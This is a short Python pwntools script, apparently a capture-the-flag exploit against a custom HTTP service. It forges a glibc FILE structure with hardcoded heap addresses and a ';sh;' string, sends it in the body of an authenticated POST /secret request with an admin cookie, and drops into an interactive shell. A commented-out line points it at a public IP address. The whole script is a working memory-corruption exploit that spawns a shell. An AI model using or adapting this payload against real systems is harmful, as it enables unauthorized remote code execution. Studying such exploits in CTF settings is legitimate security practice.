from pwn import *

r = remote("127.0.0.1", 9999)
#r = remote("1.116.205.22", 28080)

heap = 0x4000ad0250
f  = p32(0xfbad2e84)
f += b";sh;"
f += p64(0x0000004000be0000)*7
f += p64(0x0000004000be0400)
f += p64(0)*4
f += p64(0x000004000ad0010)
f += p64(1)
f += p64(0)*2
f += p64(0x0000004000ad0330)
f += p64(0xffffffffffffffff)
f += p64(0)
f += p64(0x0000004000ad0340)
f += p64(0)*3
f += p64(0xffffffff)
f += p64(0)*2
f += p64(0x4000ad0790)

p  = p64(0x4000900e60)*22
p += b"b"*0xa8
p += p64(0x4000ad0840+0xb0) # fake file ptr
p += f
p  = p.ljust(0x3f8, b'c')

data  = b"POST /secret HTTP/1.1r\n"
data += b"Authorization: Basic YWRtaW46UzNjcjM3XyFAIwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n"
data += b"Content-Length: %d\r\n" % len(p)
data += b"Cookie: username=admin;\r\n"
data += b"Referer: http://aaaaaaaaaaaaaaa/\r\n"
data += b"\r\n"
data += p

print(data)
r.sendline(data)

r.interactive()
